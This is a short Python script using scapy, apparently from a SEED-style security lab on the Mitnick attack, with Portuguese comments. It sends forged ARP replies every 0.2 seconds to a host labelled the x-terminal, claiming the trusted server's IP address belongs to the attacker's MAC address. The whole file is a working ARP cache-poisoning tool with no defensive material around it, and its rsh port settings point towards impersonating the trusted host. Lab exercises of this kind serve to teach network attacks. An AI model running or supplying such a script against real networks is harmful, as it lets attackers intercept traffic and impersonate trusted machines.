from scapy.all import *
from time import sleep

ipTrustedServer = "10.9.0.6"
ipXTerminal = "10.9.0.5"
xPort = 514
sPort = 1023

def getMac(ip):
    # Função para enviar um ARP Request para o IP - retorna o MAC
    ans, unans = arping(ip, verbose=False)
    return ans[0][1].hwsrc

if __name__ == "__main__":
    # Função para enviar pacotes ARP spoofing.
    # A cada 0.2 segundos, envia um pacote ARP para o IP do x-terminal forjando o IP do trusted-server com o MAC do seed-attacker
    while True:
        packet = ARP(op=2, pdst=ipXTerminal, hwdst=getMac(ipXTerminal), psrc=ipTrustedServer)
        send(packet, verbose=False)
        sleep(0.2)
